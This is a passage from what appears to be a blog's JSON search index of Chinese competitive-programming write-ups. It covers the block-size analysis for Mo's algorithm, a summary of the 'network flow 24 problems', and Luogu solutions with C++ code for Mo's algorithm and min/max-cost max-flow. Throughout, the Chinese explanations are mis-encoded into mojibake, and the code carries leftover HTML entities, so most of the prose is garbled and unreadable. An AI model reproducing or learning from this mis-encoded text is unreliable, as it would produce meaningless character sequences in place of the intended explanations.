n$å¯¹äºæ¯ä¸ªå·¦ç«¯ç‚¹ç›¸åŒçš„å—,å³ç«¯ç‚¹å—æ•°ä¸º$\\dfrac{n}{a}$,å·¦ç«¯ç‚¹æœ‰$\\dfrac{n}{a}$ä¸ª,æ‰€ä»¥ä¸€å…±éœ€è¦$O(\\dfrac{n}{a}\\times\\dfrac{n}{a}\\times n)=O(\\dfrac{n^3}{a^2})$ ç»¼ä¸Š,æ€»çš„å¤æ‚åº¦ä¸º$O(n\\log n)+O(na)+O(na)+O(\\dfrac{n^2}{a})+O(\\dfrac{n^3}{a^2})\\ \\sim\\ O(na+\\dfrac{n^2}{a}+\\dfrac{n^3}{a^2})$ ç”±äº$1&lt;a&lt;n$,æ‰€ä»¥$\\dfrac{\\dfrac{n^2}{a}}{\\dfrac{n^3}{a^2}}=\\dfrac{a}{n}&lt;1 \\Rightarrow \\dfrac{n^2}{a}&lt;\\dfrac{n^3}{a^2}$,æ‰€ä»¥åŸå¼å¯åŒ–ä¸º$O(na+\\dfrac{n^3}{a^2})$ æ ¹æ®å‡å€¼ä¸ç­‰å¼,å½“$na=\\dfrac{n^3}{a^2}$æ—¶ä¸Šå¼æœ€å°,å³$a=\\sqrt[3]{n^2}=n^{\\frac{2}{3}}$æ‰€ä»¥å«æœ‰ä¸‰ä¸ªæŒ‡é’ˆæ—¶,åˆ†å—å¤§å°ä¸º$n^{\\frac{2}{3}}$æ—¶æ€»å¤æ‚åº¦æœ€å°,ä¸º$O(n^{\\frac{5}{3}})=O(n\\sqrt[3]{n^2})$","link":"/p/681257d9.html"},{"title":"ã€Œç½‘ç»œæµ24é¢˜ã€æ€»ç»“åŠå›¾ç¤º","text":"é—®é¢˜ç¼–å· é—®é¢˜åç§° é—®é¢˜æ¨¡å‹ è½¬åŒ–æ¨¡å‹ 1 é£è¡Œå‘˜é…å¯¹æ–¹æ¡ˆé—®é¢˜ äºŒåˆ†å›¾æœ€å¤§åŒ¹é… ç½‘ç»œæœ€å¤§æµ 2 å¤ªç©ºé£è¡Œè®¡åˆ’é—®é¢˜ æœ€å¤§æƒé—­åˆå›¾ ç½‘ç»œæœ€å°å‰² 3 æœ€å°è·¯å¾„è¦†ç›–é—®é¢˜ æœ‰å‘æ— ç¯å›¾æœ€å°è·¯å¾„è¦†ç›– ç½‘ç»œæœ€å¤§æµ 4 é­”æœ¯çƒé—®é¢˜ æœ‰å‘æ— ç¯å›¾æœ€å°è·¯å¾„è¦†ç›– ç½‘ç»œæœ€å¤§æµ 5 åœ†æ¡Œé—®é¢˜ äºŒåˆ†å›¾å¤šé‡åŒ¹é… ç½‘ç»œæœ€å¤§æµ 6 æœ€é•¿ä¸ä¸‹é™å­åºåˆ—é—®é¢˜ æœ€å¤šä¸ç›¸äº¤è·¯å¾„ ç½‘ç»œæœ€å¤§æµ 7 è¯•é¢˜åº“é—®é¢˜ äºŒåˆ†å›¾å¤šé‡åŒ¹é… ç½‘ç»œæœ€å¤§æµ 8 æœºå™¨äººè·¯å¾„è§„åˆ’é—®é¢˜ $IDA*$ $IDA*$ 9 æ–¹æ ¼å–æ•°é—®é¢˜ äºŒåˆ†å›¾ç‚¹æƒæœ€å¤§ç‹¬ç«‹é›† ç½‘ç»œæœ€å°å‰² 10 é¤å·¾è®¡åˆ’é—®é¢˜ çº¿æ€§è§„åˆ’ç½‘ç»œä¼˜åŒ– æœ€å°è´¹ç”¨æœ€å¤§æµ 11 èˆªç©ºè·¯çº¿é—®é¢˜ æœ€é•¿ä¸ç›¸äº¤è·¯å¾„ æœ€å°è´¹ç”¨æœ€å¤§æµ 12 è½¯ä»¶è¡¥ä¸é—®é¢˜ æœ€å°è½¬ç§»ä»£ä»· æœ€çŸ­è·¯å¾„ 13 æ˜Ÿé™…è½¬ç§»é—®é¢˜ ç½‘ç»œåˆ¤å®š ç½‘ç»œæœ€å¤§æµ 14 å­¤å²›è¥æ•‘é—®é¢˜ åˆ†å±‚å›¾æœ€çŸ­è·¯å¾„ æœ€çŸ­è·¯å¾„ 15 æ±½è½¦åŠ æ²¹è¡Œé©¶é—®é¢˜ åˆ†å±‚å›¾æœ€çŸ­è·¯å¾„ æœ€çŸ­è·¯å¾„ 16 æ•°å­—æ¢¯å½¢é—®é¢˜ æœ€å¤§æƒä¸ç›¸äº¤è·¯å¾„ æœ€å°è´¹ç”¨æœ€å¤§æµ 17 è¿è¾“é—®é¢˜ ç½‘ç»œè´¹ç”¨æµé‡ æœ€å°è´¹ç”¨æœ€å¤§æµ 18 åˆ†é…é—®é¢˜ äºŒåˆ†å›¾æœ€ä½³åŒ¹é… æœ€å°è´¹ç”¨æœ€å¤§æµ 19 è´Ÿè½½å¹³è¡¡é—®é¢˜ æœ€å°ä»£ä»·ä¾›æ±‚ æœ€å°è´¹ç”¨æœ€å¤§æµ 20 æ·±æµ·æœºå™¨äººé—®é¢˜ çº¿æ€§è§„åˆ’ç½‘ç»œä¼˜åŒ– æœ€å°è´¹ç”¨æœ€å¤§æµ 21 æœ€é•¿kå¯é‡åŒºé—´é›†é—®é¢˜ æœ€å¤§æƒä¸ç›¸äº¤è·¯å¾„ æœ€å°è´¹ç”¨æœ€å¤§æµ 22 æœ€é•¿kå¯é‡çº¿æ®µé›†é—®é¢˜ æœ€å¤§æƒä¸ç›¸äº¤è·¯å¾„ æœ€å°è´¹ç”¨æœ€å¤§æµ 23 ç«æ˜Ÿæ¢é™©é—®é¢˜ çº¿æ€§è§„åˆ’ç½‘ç»œä¼˜åŒ– æœ€å°è´¹ç”¨æœ€å¤§æµ 24 éª‘å£«å…±å­˜é—®é¢˜ äºŒåˆ†å›¾æœ€å¤§ç‹¬ç«‹é›† ç½‘ç»œæœ€å°å‰² äºŒåˆ†å›¾ æœ€å¤§åŒ¹é…: åŒˆç‰™åˆ©/æœ€å¤§æµ å¸¦æƒåŒ¹é…: KM/è´¹ç”¨æµ æœ€å°ç‚¹è¦†ç›–: =æœ€å¤§åŒ¹é… æœ€å°è¾¹è¦†ç›–: =æ€»ç»“ç‚¹æ•°-æœ€å¤§åŒ¹é… æœ€å¤§ç‹¬ç«‹é›†: =æ€»ç»“ç‚¹æ•°-æœ€å¤§åŒ¹é… ç½‘ç»œæµ å»ºç«‹è¶…çº§æºç‚¹,è¶…çº§æ±‡ç‚¹ ç‚¹å­˜åœ¨é™åˆ¶,æ‹†æˆå‡ºå…¥ç‚¹,å°†å‡ºå…¥ç‚¹ä¹‹é—´çš„è¾¹çœ‹åšç‚¹,é™åˆ¶æµé‡ å»ºå›¾è€ƒè™‘å·¦å³äºŒéƒ¨ è¶…çº§æºç‚¹å‘æºç‚¹çš„è¾¹å¯ä»¥é™åˆ¶æ€»æµé‡ æ— æºæ±‡æœ‰å®¹é‡ä¸‹ç•Œ:s-ä¸‹ç•Œ-&gt;v u-ä¸‹ç•Œ-&gt;t u-ä¸Šç•Œå‡ä¸‹ç•Œ-&gt;v,å½“æ»¡æµæ—¶å­˜åœ¨å¯è¡Œæµ æœ€å°å‰²ä¸­èµ‹æµé‡ä¸ºinfåˆ™ä¸€å®šä¸ä¼šå‰²å» ä¸€äº›æ±‚æœ€å¤§é—®é¢˜,å¯ä»¥ç”¨sum-æœ€å°å‰² æœ€å¤§æƒé—­åˆå›¾: å»ºå›¾,æœ€å°å‰²,ä»å’Œsç›¸è¿çš„ä¸ºæœ€å¤§æƒé—­åˆå›¾,æƒå€¼å’Œä¸ºsum-æœ€å°å‰² 24é¢˜ ç›´æ¥å»ºäºŒåˆ†å›¾,æœ€å¤§æµæ±‚æœ€å¤§åŒ¹é… æœ€å¤§æƒé—­åˆå›¾,å»ºè¾¹,å®éªŒå’Œä»ªå™¨ä¹‹é—´ä¿è¯ä¸åˆ‡å‰²å®¹é‡ä¸ºinf,è·‘æœ€å°å‰²,æ‰¾ä¸sç›¸è¿çš„å®éªŒå’Œä»ªå™¨ æœ€å¤§ç‹¬ç«‹é›†,æ€»ç»“ç‚¹æ•°-æœ€å¤§æµ è´ªå¿ƒ äºŒåˆ†å›¾å¤šé‡åŒ¹é…,s-&gt;å·¦ç‚¹é›†å’Œå³ç‚¹é›†-&gt;tä¹‹é—´çš„è¾¹å®¹é‡ä¸ä¸º1(å³å¯ä»¥é€‰å¤šæ¬¡) åŠ¨æ€è§„åˆ’+æŒ‰ç…§åŠ¨æ€è§„åˆ’çš„dpæ•°ç»„çš„æ„ä¹‰å»ºè¾¹æ±‚æœ€å¤§æµ äºŒåˆ†å›¾å¤šé‡åŒ¹é…,ç±»å‹-é¢˜ç›®æ•°-&gt;æ±‡ç‚¹,ä¿è¯å¯é€‰å¤šä¸ª,å­˜åœ¨æ»¡æµåˆ™å­˜åœ¨ç­”æ¡ˆæ²¿æ»¡æµè¾“å‡º $IDA*$çˆ†æœ,ä½†æ´›è°·æ•°æ®åº”è¯¥æœ‰é—®é¢˜ æŠ½è±¡å‡ºä¸¤ä¸ªç‚¹é›†,æ±‚æœ€å¤§ç‹¬ç«‹é›† æŒ‰ç…§é¢˜ç›®è¯´æ˜å»ºå›¾,è·‘è´¹ç”¨æµ æŒ‰ç…§é¢˜ç›®è¯´æ˜å»ºå›¾,è·‘è´¹ç”¨æµ å°†é”™è¯¯çŠ¶æ€è¿›è¡Œå‹ç¼©,ç„¶åè·‘æœ€çŸ­è·¯ æ ¹æ®æ—¶é—´é€å±‚å»ºå›¾,ç›´åˆ°è·‘å‡ºå¯è¡Œæµ å°†æ‹¥æœ‰é’¥åŒ™è¿›è¡Œå‹ç¼©,è·‘æœ€çŸ­è·¯ å»ºå‡ºåˆ†å±‚å›¾,è·‘æœ€çŸ­è·¯æˆ–è€…è´¹ç”¨æµ å¯¹ä¸‰ä¸ªè§„åˆ™åˆ†åˆ«å»ºå›¾,è·‘è´¹ç”¨æµ çº¯è´¹ç”¨æµ äºŒåˆ†å›¾æœ€ä½³åŒ¹é…,ä½¿ç”¨è´¹ç”¨æµ è´¹ç”¨æµ,æ³¨æ„ç¯å½¢ æŒ‰ç…§é¢˜ç›®è¦æ±‚å»ºå›¾,è·‘è´¹ç”¨æµ ç¦»æ•£åŒ–,å°†åŒºé—´è½¬åŒ–ä¸ºè¾¹,è´¹ç”¨æµ è½¬åŒ–é—®é¢˜,å˜æˆ21é¢˜,æ³¨æ„ç«¯ç‚¹å¤„ç†å’Œå‚ç›´äºxè½´çš„çº¿æ®µ æŒ‰ç…§é¢˜ç›®è¦æ±‚å»ºå›¾,è·‘è´¹ç”¨æµ,æ–¹æ¡ˆdfs å°†å›¾ä¸Šæ‰€æœ‰æ ¼ç‚¹è½¬åŒ–ä¸ºä¸¤ä¸ªç‚¹é›†,å»ºäºŒåˆ†å›¾,æ±‚æœ€å¤§ç‹¬ç«‹é›† å›¾ç¤ºæ›´æ–°ä¸­","link":"/p/dccbc6bb.html"},{"title":"ã€ŒLuogu P1494ã€å°Zçš„è¢œå­-é¢˜è§£","text":"é¢˜ç›®ä¼ é€é—¨: ã€ŒLuogu P1494ã€å°Zçš„è¢œå­ä¸€é“æ¨å…¬å¼ï¼Œåä½¿ç”¨è«é˜Ÿ ç„å­¦ ä¼˜åŒ–çš„é¢˜ç›® é¢˜ç›®å¤§æ„ç»™å‡º$n$ä¸ªè¢œå­,ç¬¬$i$åªè¢œå­çš„é¢œè‰²ä¸º$c_i$æœ‰$m$ä¸ªè¯¢é—®,ç”¨$L,R$è¡¨ç¤ºåœ¨åŒºé—´$[L,R]$ä¸­éšæœºå–è¢œå­,æ±‚å–å‡ºä¸¤åªè¢œå­é¢œè‰²ç›¸åŒçš„æ¦‚ç‡(æœ€ç®€åˆ†æ•°) é¢˜è§£è€ƒè™‘åŒºé—´$[L,R]$,å…¶ä¸­é¢œè‰²ä¸º$A$çš„è¢œå­æœ‰$a$åª,é¢œè‰²ä¸º$B$çš„è¢œå­æœ‰$b$åª$â€¦$ å–å‡ºä¸¤åªè¢œå­çš„æ€»æƒ…å†µæ•°ä¸º$$C_{R-L+1}^2=\\frac{(R-L+1)(R-L)}{2}$$å–å‡ºä¸¤åªè¢œå­é¢œè‰²éƒ½ä¸º$A$çš„æƒ…å†µæ•°ä¸º$$C_a^2=\\frac{a(a - 1)}{2}$$æ‰€ä»¥,å–å‡ºä¸¤åªè¢œå­é¢œè‰²ç›¸åŒçš„æƒ…å†µæ•°ä¸º$$\\sum_{i}C_i^2=C_a^2+C_b^2+â€¦=\\frac{a(a-1)}{2}+\\frac{b(b-1)}{2}+â€¦$$æ‰€ä»¥æœ€ç»ˆçš„æ¦‚ç‡ä¸º$$\\begin{aligned}P&amp;=\\frac{\\displaystyle\\sum_{i}C_i^2}{C_{R-L+1}^2}\\\\\\\\&amp;=\\dfrac{\\dfrac{a(a-1)}{2}+\\dfrac{b(b-1)}{2}+â€¦}{ \\dfrac{(R-L+1)(R-L)}{2} }\\\\\\\\&amp;=\\dfrac{a^2+b^2+â€¦-a-b-â€¦}{(R-L+1)(R-L)}\\\\\\\\&amp;=\\dfrac{\\displaystyle\\sum_ii^2-\\displaystyle\\sum_ii}{(R-L+1)(R-L)}\\\\\\\\&amp;=\\dfrac{\\displaystyle\\sum_ii^2-(R-L+1)}{(R-L+1)(R-L)}\\end{aligned}$$æ‰€ä»¥è¦æ±‚çš„å°±æ˜¯$\\displaystyle\\sum_ii^2$,å¯ä»¥ç”¨è«é˜Ÿæ¥ç»´æŠ¤åŒºé—´å¹³æ–¹å’Œå¾—åˆ° å¯¹äºæœ€ç»ˆç»“æœçš„è¡¨è¾¾å¼,ä»¤$a=$åˆ†å­,$b=$åˆ†æ¯,æ±‚å‡º$ab$çš„æœ€å¤§å…¬çº¦æ•°,å¹¶é™¤å»æœ€ç»ˆç­”æ¡ˆå³ä¸º$a/b$ ä»£ç 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include &lt;bits/stdc++.h&gt;using namespace std;typedef long long LL;inline int read() { int x = 0; int f = 1; char ch = getchar(); while (!isdigit(ch)) {if (ch == '-') f = -1; ch = getchar();} while (isdigit(ch)) {x = x * 10 + ch - 48; ch = getchar();} return x * f;}LL gcd(LL a, LL b) { return b == 0 ? a : gcd(b, a % b); }const int maxn = 50010;struct Query { int l, r, pos, id;}q[maxn];bool cmp(Query a, Query b) { if (a.pos != b.pos) return a.pos &lt; b.pos; if (a.pos &amp; 1) return a.r &lt; b.r; return a.r &gt; b.r;}struct Answer { LL a, b;}ans[maxn];int n, m, l, r, Ans, len;LL c[maxn], cnt[maxn];void del(int x) { Ans -= cnt[c[x]] * cnt[c[x]]; cnt[c[x]]--; Ans += cnt[c[x]] * cnt[c[x]];}void add(int x) { Ans -= cnt[c[x]] * cnt[c[x]]; cnt[c[x]]++; Ans += cnt[c[x]] * cnt[c[x]];}int main() { n = read(); m = read(); len = sqrt(n); for (int i = 1; i &lt;= n; ++i) c[i] = read(); for (int i = 1; i &lt;= m; ++i) { q[i].l = read(); q[i].r = read(); q[i].id = i; q[i].pos = q[i].l / len + 1; } sort(q + 1, q + 1 + m, cmp); l = 1; for (int i = 1; i &lt;= m; ++i) { while (l &lt; q[i].l) del(l++); while (r &gt; q[i].r) del(r--); while (l &gt; q[i].l) add(--l); while (r &lt; q[i].r) add(++r); if (l == r) { ans[q[i].id].a = 0; ans[q[i].id].b = 1; continue; } LL a = Ans - (r - l + 1); LL b = 1LL * (r - l + 1) * (LL)(r - l); LL g = gcd(a, b); ans[q[i].id].a = a / g; ans[q[i].id].b = b / g; } for (int i = 1; i &lt;= m; ++i) { printf(&quot;%lld/%lld\\n&quot;, ans[i].a, ans[i].b); } return 0;}","link":"/p/49548215.html"},{"title":"ã€Œç½‘ç»œæµ24é¢˜ã€è´Ÿè½½å¹³è¡¡é—®é¢˜-é¢˜è§£","text":"é¢˜ç›®ä¼ é€é—¨: ã€ŒLuogu P4016ã€è´Ÿè½½å¹³è¡¡é—®é¢˜ é¢˜ç›®å¤§æ„æœ‰$n$ä¸ªç¯å½¢çš„ä»“åº“,æ¯ä¸ªä»“åº“å­˜å‚¨ä¸€å®šæ•°é‡çš„è´§ç‰©è´§ç‰©å¯ä»¥åœ¨ç›¸é‚»ä»“åº“ä¹‹é—´æ¬è¿,æœ€ç»ˆè¾¾åˆ°æ¯ä¸ªä»“è´§ç‰©æ•°é‡ä¸€æ ·çš„æ•ˆæœ æ±‚æœ€å°‘æ¬è¿æ¬¡æ•° é¢˜è§£çœ‹é¢˜è§£è¯´å¯ä»¥ç”¨æ•°å­¦æ–¹æ³•æ¨å¯¼,ä½†æ˜¯åœ¨24é¢˜é‡Œè¿˜æ˜¯é€‰æ‹©ç”¨è´¹ç”¨æµæ°´è¿‡ å…ˆæ±‚å‡ºå¹³å‡æ•°,å³ç›®æ ‡ç„¶åå°†æ¯ä¸ªä»“åº“çš„è´§ç‰©æ•°å‡å»å¹³å‡æ•°,å¾—å‡ºéœ€è¦ç§»åŠ¨çš„æ•°é‡ å¦‚æœå¤§äº$0$,åˆ™ä» æºç‚¹ å‘ è¯¥ä»“åº“ å»ºä¸€æ¡ å®¹é‡ä¸ºå·®å€¼,è´¹ç”¨ä¸º$0$ çš„è¾¹(éœ€è¦è½¬ç§»å‡º,å¯¹ç­”æ¡ˆæ— è´¡çŒ®) å¦‚æœå°äº$0$,åˆ™ä» è¯¥ä»“åº“ å‘ æ±‡ç‚¹ å»ºä¸€æ¡ å®¹é‡ä¸ºå·®å€¼ç»å¯¹å€¼,è´¹ç”¨ä¸º$0$ çš„è¾¹(å¸æ”¶è¿™äº›è´§ç‰©,å¯¹ç­”æ¡ˆæ— è´¡çŒ®) ä» æ¯ä¸ªä»“åº“ å‘ ç›¸é‚»ä¸¤ä¸ªä»“åº“ å»ºä¸€æ¡ å®¹é‡ä¸º$inf$,è´¹ç”¨ä¸º$1$ çš„è¾¹(è½¬ç§»è´§ç‰©çš„æ•°é‡æ— è¦æ±‚,å¯¹ç­”æ¡ˆè´¡çŒ®ä¸º$1$) æ³¨æ„å»ºè¾¹3.éœ€è¦è€ƒè™‘ç¯å½¢æ±‚å‡ºæœ€å°è´¹ç”¨æœ€å¤§æµ,æœ€å°è´¹ç”¨å³ä¸ºç»“æœ å› ä¸ºè´¹ç”¨æµå¤§å‰ææ˜¯æ»¡è¶³æœ€å¤§æµ,è€Œä¸”æ­¤å›¾ä¸­æºç‚¹å‡ºå‘çš„ä¸æµå…¥æ±‡ç‚¹çš„è¾¹çš„å®¹é‡å’Œç›¸ç­‰,æ‰€ä»¥æœ€å¤§æµæƒ…å†µä¸‹ä¸€å®šä¼šå…¨éƒ¨æµè¿‡,å³è¾¾åˆ°ä»“åº“è´§ç‰©æ•°é‡å¹³è¡¡ ä»£ç 1234567891011121314151617181920212223// æœ€å°è´¹ç”¨æœ€å¤§æµæ¨¡æ¿çœå»äº†int num[110], tot;int main() { n = read(); s = 0; t = n + 1; for (int i = 1; i &lt;= n; ++i) { num[i] = read(); tot += num[i]; } tot /= n; for (int i = 1; i &lt;= n; ++i) { if (num[i] - tot &gt; 0) add(s, i, num[i] - tot, 0); if (num[i] - tot &lt; 0) add(i, t, tot - num[i], 0); if (i != 1) { add(i, i - 1, inf, 1); add(i - 1, i, inf, 1); } } add(1, n, inf, 1); add(n, 1, inf, 1); ansflow = MinCostMaxFlow(anscost); printf(&quot;%lld\\n&quot;, anscost); return 0;}","link":"/p/b8624866.html"},{"title":"ã€Œç½‘ç»œæµ24é¢˜ã€è¿è¾“é—®é¢˜-é¢˜è§£","text":"é¢˜ç›®ä¼ é€é—¨: ã€ŒLuogu P4015ã€è¿è¾“é—®é¢˜ é¢˜ç›®å¤§æ„$m$ä¸ªä»“åº“,$n$ä¸ªå•†åº—,æ¯ä¸ªä»“åº“æœ‰$a_i$ä¸ªè´§ç‰©,æ¯ä¸ªå•†åº—éœ€è¦$b_i$ä¸ªè´§ç‰©éœ€è¦ä»ä»“åº“è¿è¾“è´§ç‰©åˆ°å•†åº—ä¸­,ä¸”ç¬¬$i$ä¸ªä»“åº“è¿è¾“åˆ°ç¬¬$j$ä¸ªå•†åº—è´¹ç”¨ä¸º$c_{i,j}$ æ±‚æœ€å°è´¹ç”¨å’Œæœ€å¤§è´¹ç”¨ é¢˜è§£å’ŒP4015 åˆ†é…é—®é¢˜ä¸€æ ·å°†æ‰€æœ‰ä»“åº“å’Œæ‰€æœ‰å•†åº—å„åˆ†ä¸ºä¸€ä¸ªç‚¹é›† ä» æºç‚¹ å‘ æ¯ä¸ªä»“åº“ å»ºä¸€æ¡ å®¹é‡ä¸ºè´§ç‰©ä¸ªæ•°$a_i$,è´¹ç”¨ä¸º$0$ çš„è¾¹(æœ‰$a_i$ä¸ªè´§ç‰©éœ€è¦è¿å‡º,ä¸”å¯¹ç­”æ¡ˆæ— è´¡çŒ®) ä» æ¯ä¸ªå•†åº— å‘ æ±‡ç‚¹ å»ºä¸€æ¡ å®¹é‡ä¸ºè´§ç‰©ä¸ªæ•°$b_i$,è´¹ç”¨ä¸º$0$ çš„è¾¹(éœ€è¦$b_i$ä¸ªè´§ç‰©,ä¸”å¯¹ç­”æ¡ˆæ— è´¡çŒ®) ä» æ¯ä¸ªä»“åº“ å‘ æ¯ä¸ªå•†åº— å»ºä¸€æ¡ å®¹é‡ä¸º$inf$,è´¹ç”¨ä¸ºå¯¹åº”è´¹ç”¨ çš„è¾¹(æ¯ä¸ªä»“åº“å¯ä»¥è¿å‡ºçš„æœ€å¤šè´§ç‰©ä¸é™åˆ¶,ä¸”å¯¹ç­”æ¡ˆå·¥ä½œä¸ºå¯¹åº”è´¹ç”¨) æ±‚å‡ºæœ€å°è´¹ç”¨æœ€å¤§æµå’Œæœ€å¤§è´¹ç”¨æœ€å¤§æµå³å¯ ç”±äºè´¹ç”¨æµçš„å¤§å‰ææ˜¯æµé‡æœ€å¤§,æ‰€ä»¥ä¸€å®šæ»¡è¶³é¢˜ç›®ä¸­è¦æ±‚çš„ä¾›éœ€å¹³è¡¡å³$\\sum\\limits_{i=1}^{m}a_i=\\sum\\limits_{j=1}^{n}b_j$ ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839// è´¹ç”¨æµæ¨¡æ¿çœç•¥,åœ¨P4015é¢˜è§£é‚£é‡Œæœ‰// ä»£ç é‡Œä¸ºäº†æ–¹ä¾¿æŠŠmnè°ƒæ¢äº†int input1[110], input2[110], input3[110][110];int main() { n = read(); m = read(); s = 0; t = n + m + 1; for (int i = 1; i &lt;= n; ++i) { int c = read(); input1[i] = c; add(s, i, c, 0); } for (int i = 1; i &lt;= m; ++i) { int c = read(); input2[i] = c; add(i + n, t, c, 0); } for (int i = 1; i &lt;= n; ++i) { for (int j = 1; j &lt;= m; ++j) { int c = read(); input3[i][j] = c; add(i, j + n, inf, c); } } ansflow = MinCostMaxFlow(anscost); printf(&quot;%lld\\n&quot;, anscost); edges.clear(); for (int i = 0; i &lt; maxn; ++i) G[i].clear(); for (int i = 1; i &lt;= n; ++i) add(s, i, input1[i], 0); for (int i = 1; i &lt;= m; ++i) add(i + n, t, input2[i], 0); for (int i = 1; i &lt;= n; ++i) { for (int j = 1; j &lt;= m; ++j) { add(i, j + n, inf, input3[i][j]); } } ansflow = MaxCostMaxFlow(anscost); printf(&quot;%lld\\n&quot;, anscost); return 0;}","link":"/p/152673e9.html"},{"title":"ã€Œç½‘ç»œæµ24é¢˜ã€åˆ†é…é—®é¢˜-é¢˜è§£","text":"é¢˜ç›®ä¼ é€é—¨: ã€ŒLuogu P4014ã€åˆ†é…é—®é¢˜ é¢˜ç›®å¤§æ„æœ‰$n$ä»¶å·¥ä½œè¦åˆ†é…ç»™$n$ä¸ªäººåšç»™å‡ºæ¯ä¸ªäººåšæ¯ä¸ªå·¥ä»¶çš„æ•ˆç›Š$c_{i,j}$ æ±‚æœ€å°æ•ˆç›Šå’Œæœ€å¤§æ•ˆç›Š é¢˜è§£è£¸çš„æœ€å°/å¤§è´¹ç”¨æœ€å¤§æµå°†æ‰€æœ‰äººå’Œæ‰€æœ‰å·¥ä½œå„åˆ†ä¸ºä¸€ä¸ªç‚¹é›† ä» æºç‚¹ å‘ æ‰€æœ‰äºº å»ºä¸€æ¡ å®¹é‡ä¸º$1$,è´¹ç”¨ä¸º$0$ çš„è¾¹(åªèƒ½é€‰ä¸€æ¬¡,ä¸”å¯¹ç­”æ¡ˆæ— è´¡çŒ®) ä» æ‰€æœ‰å·¥ä½œ å‘ æ±‡ç‚¹ å»ºä¸€æ¡ å®¹é‡ä¸º$1$,è´¹ç”¨ä¸º$0$ çš„è¾¹(åªèƒ½åšä¸€æ¬¡,ä¸”å¯¹ç­”æ¡ˆæ— è´¡çŒ®) ä» æ¯ä¸ªäºº å‘ æ‰€æœ‰å·¥ä½œ å»ºä¸€æ¡ å®¹é‡ä¸º$1$,è´¹ç”¨ä¸ºå¯¹åº”æ•ˆç›Š çš„è¾¹(åªèƒ½åšä¸€ç§å·¥ä½œ,ä¸”å¯¹ç­”æ¡ˆå·¥ä½œä¸ºå¯¹åº”æ•ˆç›Š) æ±‚å‡ºæœ€å°è´¹ç”¨æœ€å¤§æµå’Œæœ€å¤§è´¹ç”¨æœ€å¤§æµ ä¸¤ä¸ªé—®ä¹‹é—´è¦æ¸…ç©ºå›¾å¹¶é‡å»º(å› ä¸ºæ±‚æœ€å¤§æµè¿‡ç¨‹ä¸­ä¼šä¿®æ”¹flow) ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111#include &lt;bits/stdc++.h&gt;using namespace std;inline int read() { int x = 0; int f = 1; char ch = getchar(); while (!isdigit(ch)) {if (ch == '-') f = -1; ch = getchar();} while (isdigit(ch)) {x = x * 10 + ch - 48; ch = getchar();} return x * f;}const int maxn = 310;const int inf = 0x3f3f3f3f;const int ninf = 0xc0c0c0c0;int n, m, s, t, ansflow;int vis[maxn], d[maxn], p[maxn], a[maxn];long long anscost;struct Edge { int from, to, cap, flow, cost; Edge(int u, int v, int c, int f, int w): from(u), to(v), cap(c), flow(f), cost(w){}};vector&lt;Edge&gt; edges;vector&lt;int&gt; G[maxn];void add(int u, int v, int c, int w) { edges.push_back(Edge(u, v, c, 0, w)); edges.push_back(Edge(v, u, 0, 0,-w)); int mm = edges.size(); G[u].push_back(mm - 2); G[v].push_back(mm - 1);}bool BellmanFord(int&amp; flow, long long&amp; cost, int opt) { if (opt == 0) memset(d, 0x3f, sizeof(d)); else memset(d, 0xc0, sizeof(d)); memset(vis, 0, sizeof(vis)); d[s] = 0; vis[s] = 1; p[s] = 0; a[s] = inf; queue&lt;int&gt; Q; Q.push(s); while (!Q.empty()) { int x = Q.front(); Q.pop(); vis[x] = 0; for (int i = 0; i &lt; G[x].size(); ++i) { Edge&amp; e = edges[G[x][i]]; bool judge; if (opt) judge = d[e.to] &lt; d[x] + e.cost; else judge = d[e.to] &gt; d[x] + e.cost; if (e.cap &gt; e.flow &amp;&amp; judge) { d[e.to] = d[x] + e.cost; p[e.to] = G[x][i]; a[e.to] = min(a[x], e.cap - e.flow); if (!vis[e.to]) { Q.push(e.to); vis[e.to] = 1; } } } } if (!opt &amp;&amp; d[t] == inf) return false; if (opt &amp;&amp; d[t] == ninf) return false; flow += a[t]; cost += (long long)d[t] * (long long)a[t]; for (int u = t; u != s; u = edges[p[u]].from) { edges[p[u]].flow += a[t]; edges[p[u] ^ 1].flow -= a[t]; } return true;}int MinCostMaxFlow(long long&amp; cost) { int flow = 0; cost = 0; while (BellmanFord(flow, cost, 0)); return flow;}int MaxCostMaxFlow(long long&amp; cost) { int flow = 0; cost = 0; while (BellmanFord(flow, cost, 1)); return flow;}int tmp[110][110];int main() { n = read(); s = 0; t = n * 2 + 1; for (int i = 1; i &lt;= n; ++i) { for (int j = 1; j &lt;= n; ++j) { int c = read(); tmp[i][j] = c; add(i, j + n, 1, c); } } for (int i = 1; i &lt;= n; ++i) { add(s, i, 1, 0); add(i + n, t, 1, 0); } ansflow = MinCostMaxFlow(anscost); printf(&quot;%lld\\n&quot;, anscost); edges.clear(); for (int i = 0; i &lt; maxn; ++i) G[i].clear(); for (int i = 1; i &lt;= n; ++i) { for (int j = 1; j &lt;= n; ++j) { add(i, j + n, 1, tmp[i][j]); } } for (int i = 1; i &lt;= n; ++i) { add(s, i, 1, 0); add(i + n, t, 1, 0); } ansflow = MaxCostMaxFlow(anscost); printf(&quot;%lld\\n&quot;, anscost); return 0;}","link":"/p/11b1dcbd.html"},{"title":"ã€Œç½‘ç»œæµ24é¢˜ã€æ•°å­—æ¢¯å½¢é—®é¢˜-é¢˜è§£","text":"é¢˜ç›®ä¼ é€é—¨: ã€ŒLuogu P4013ã€æ•°å­—æ¢¯å½¢é—®é¢˜ é¢˜ç›®å¤§æ„æ¢¯å½¢çš„ç¬¬ä¸€è¡Œæœ‰$m$ä¸ªæ•°å­—ä»æ¢¯å½¢çš„é¡¶éƒ¨çš„$m$ä¸ªæ•°å­—å¼€å§‹,åœ¨æ¯ä¸ªæ•°å­—å¤„å¯ä»¥æ²¿å·¦ä¸‹æˆ–å³ä¸‹æ–¹å‘ç§»åŠ¨,å½¢æˆä¸€æ¡ä»æ¢¯å½¢çš„é¡¶è‡³åº•çš„è·¯å¾„ã€‚ æœ‰ä¸‰ç§è§„åˆ™: ä»æ¢¯å½¢çš„é¡¶è‡³åº•çš„$m$æ¡è·¯å¾„äº’ä¸ç›¸äº¤ ä»æ¢¯å½¢çš„é¡¶è‡³åº•çš„$m$æ¡è·¯å¾„ä»…åœ¨æ•°å­—ç»“ç‚¹å¤„ç›¸äº¤ 